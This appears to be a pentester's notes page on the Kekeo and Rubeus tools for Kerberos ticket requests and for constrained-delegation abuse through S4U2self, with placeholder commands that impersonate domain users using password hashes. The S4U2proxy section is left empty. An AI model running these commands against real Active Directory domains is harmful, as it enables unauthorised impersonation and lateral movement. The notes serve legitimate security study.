# kekeo/rubeus

### Resources

1. **Rubeus**

{% embed url="https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u" %}

2. **Kekeo**

{% embed url="https://github.com/gentilkiwi/kekeo" %}

3. **S4U2self and S4U2proxy**

{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13" %}

{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a" %}



For each of the following sections, I aim to provide the equivalent commands in **Kekeo** and **Rubeus** (some of the sections may only have examples in one tool).

### 1. Request for Ticket Granting Ticket (TGT)

```powershell
kekeo # tgt::ask /user:<user> /domain:<domain> /password:<password>
C:\> rubeus.exe /user:<user> /password:<password>
```

* For rubeus, if `/password` is used instead of a hash, `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options

### 2. Request for Ticket Granting Service (TGS)

```powershell
C:\> rubeus.exe asktgs /ticket:<ticket> /service:<servicename>
```

### 3. Constrained delegation abuse: Service for User (S4U)

```
kekeo # tgs::s4u /tgt:<path_to_TGT> /user:<username> /service:<servicename>
```

{% embed url="https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u" %}

From the Rubeus S4U documentation page link above, we can find a few examples:

#### a. S4U2self

{% code overflow="wrap" %}
```powershell
C:\> rubeus.exe s4u /user:<username> /rc4:<rc4_hash> /impersonateuser:<user_to_impersonate>
```
{% endcode %}

* `/rc4`: rc4 hash of the user associated with `/user`
  * The TGT  for an account with a _**msds-allowedtodelegateto**_ permission can be used instead (`/ticket:X`)
* `/impersonateuser` : compulsory parameter to specify the user we plan to obtain a service ticket on behalf for

From this command, we will obtain the following:

1. TGT for the user specified in `/user`&#x20;
2. TGS for the user specified in `/impersonateuser`&#x20;

* Using the S4U2self extension, where the service account can use the TGS obtained to authenticate to the service its running on behalf of the user specified in `/impersonateuser`&#x20;

#### b. S4U2proxy

```powershell
```



{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94" %}





